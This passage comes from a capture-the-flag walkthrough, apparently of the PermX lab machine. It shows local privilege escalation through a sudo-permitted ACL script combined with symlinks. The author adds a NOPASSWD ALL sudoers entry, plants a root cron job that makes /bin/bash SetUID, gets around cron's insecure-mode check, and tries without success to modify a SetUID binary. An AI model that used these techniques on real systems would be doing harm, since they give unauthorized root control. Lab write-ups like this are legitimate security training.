@includedir /etc/sudoers.d
mtz ALL=(ALL:ALL) NOPASSWD: /opt/acl.sh

```

I’ll add this line to the end:

```

mtz ALL=(ALL) NOPASSWD: ALL

```

Now I can run any command as any user:

```

mtz@permx:~$ sudo -l
Matching Defaults entries for mtz on permx:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User mtz may run the following commands on permx:
    (ALL : ALL) NOPASSWD: /opt/acl.sh
    (ALL) NOPASSWD: ALL

```

With this permission, `sudo -i` is a nice way to just get an interactive shell as the root user:

```

mtz@permx:~$ sudo -i
root@permx:~#

```

#### crontab

The `/etc/crontab` file controls how the cron daemon runs scheduled tasks on Linux systems. On PermX it looks like:

```

# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
# You can also override PATH, but by default, newer versions inherit it from the environment
#PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )

```

The first five values are the minute, hour, day of the month, month, and day of the week to run the task, where “\*” means any. So `run-parts --report /etc/cron.hourly` runs at the 17th minute of every hour. The next line runs `/etc/cron.daily` each day at 6:25.

The next value is the user to run as, which in this case is all root.

I’ll do the same thing as before to give permissions on the file to the mtz user:

```

mtz@permx:~$ ln -s /etc/crontab
mtz@permx:~$ sudo /opt/acl.sh mtz rwx /home/mtz/crontab 
mtz@permx:~$ getfacl /home/mtz/crontab
getfacl: Removing leading '/' from absolute path names
# file: home/mtz/crontab
# owner: root
# group: root
user::rw-
user:mtz:rwx
group::r--
mask::rwx
other::r--

```

I’ll create a cron that sets `/bin/bash` as SetUID every minute:

```

mtz@permx:~$ echo "* * * * * root chmod 6777 /bin/bash" >> /etc/crontab 

```

As is, this never runs. To see why, I’ll look at the status of the `cron` service as root:

```

root@permx:~# service cron status
● cron.service - Regular background program processing daemon
     Loaded: loaded (/lib/systemd/system/cron.service; enabled; vendor preset: enabled)
     Active: active (running) since Mon 2024-10-28 19:03:52 UTC; 30min ago
       Docs: man:cron(8)
   Main PID: 2347 (cron)
      Tasks: 1 (limit: 4513)
     Memory: 344.0K
        CPU: 24ms
     CGroup: /system.slice/cron.service
             └─2347 /usr/sbin/cron -f -P

Oct 28 19:03:52 permx cron[2347]: (CRON) INFO (pidfile fd = 3)
Oct 28 19:03:52 permx cron[2347]: (*system*) INSECURE MODE (group/other writable) (/etc/crontab)
Oct 28 19:03:52 permx cron[2347]: (CRON) INFO (Skipping @reboot jobs -- not system startup)

```

The second log line shows the issue. It’s seeing that the permissions on `/etc/crontab` are too lax (writable outside of root), and skipping this file.

However, I can fix that. I’ll set the facl to not allow mtz any rights on the file:

```

mtz@permx:~$ sudo /opt/acl.sh mtz - /home/mtz/crontab

```

Now, mtz can no longer read or write the file, but `cron` will reload and now the permissions are good so it will run. When the next minute roles, `bash` is SetUID:

```

mtz@permx:~$ ls -l /bin/bash
-rwsrwsrwx 1 root root 1396520 Mar 14  2024 /bin/bash

```

#### SetUID Binary [Fail]

Another idea would be to find a SetUID binary and modify it so that it gives a shell. I’ll get a list of the SetUID binaries on the box:

```

mtz@permx:~$ find / -perm -4000 2>/dev/null
/usr/bin/mount
/usr/bin/sudo
/usr/bin/umount
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/chfn
/usr/libexec/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper

```

I’ll mess with the `newgrp` binary, which is SetUID as shown by the `s` instead of the `x` in the 4th place:

```

mtz@permx:~$ ls -l /usr/bin/newgrp 
-rwsr-xr-x 1 root root 40496 Feb  6  2024 /usr/bin/newgrp

```

I’m able to create a symlink and update the permissions, and it’s still got the `s`:

```

mtz@permx:~$ ln -s /usr/bin/newgrp 
mtz@permx:~$ sudo /opt/acl.sh mtz rwx /home/mtz/newgrp 
mtz@permx:~$ ls -l /usr/bin/newgrp 
-rwsrwxr-x+ 1 root root 40496 Feb  6  2024 /usr/bin/newgrp

```

However, as soon as I write to it in anyway, it loses that permission:

```

mtz@permx:~$ echo " " >> /usr/bin/newgrp 
mtz@permx:~$ ls -l /usr/bin/newgrp 
-rwxrwxr-x+ 1 root root 40498 Oct 28 19:45 /usr/bin/newgrp

```

Linux [removes SetUID after file modification](https://unix.stackexchange.com/questions/284947/why-suid-bit-is-unset-after-file-modification) by a non-root user.